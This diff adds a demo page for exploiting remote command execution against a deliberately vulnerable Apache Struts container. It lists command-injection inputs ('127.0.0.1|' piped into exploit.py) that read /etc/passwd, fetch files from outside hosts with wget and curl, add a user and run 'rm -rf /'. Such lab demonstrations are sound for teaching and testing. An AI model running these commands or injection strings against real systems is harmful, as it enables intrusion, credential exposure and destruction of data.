@@ -1,0 +1,15 @@
+This interface can be used to execute remote command execution using the docker image "andrefernandes86/demo-apachestruts-target" as a target.
+.
+Starting the Vulnerable Container
+docker run -d --rm -p 80:8080 andrefernandes86/demo-apachestruts-target </h2>
+.
+Examples of commands that can be executed.. </h2>
+.
+127.0.0.1| python http://target-ip/hello "command"
+127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
+127.0.0.1| python exploit.py http://target-ip/hello "cat /etc/passwd"
+127.0.0.1| python exploit.py http://target-ip/hello "wget http://2016.eicar.org/download/eicar.com"
+127.0.0.1| python exploit.py http://target-ip/hello "curl http://wrs21.winshipway.com/"
+127.0.0.1| python exploit.py http://target-ip/hello "adduser YouHaveBeenPwned"
+127.0.0.1| python exploit.py http://target-ip/hello "ls -la"
+127.0.0.1| python exploit.py http://target-ip/hello "rm -rf /"
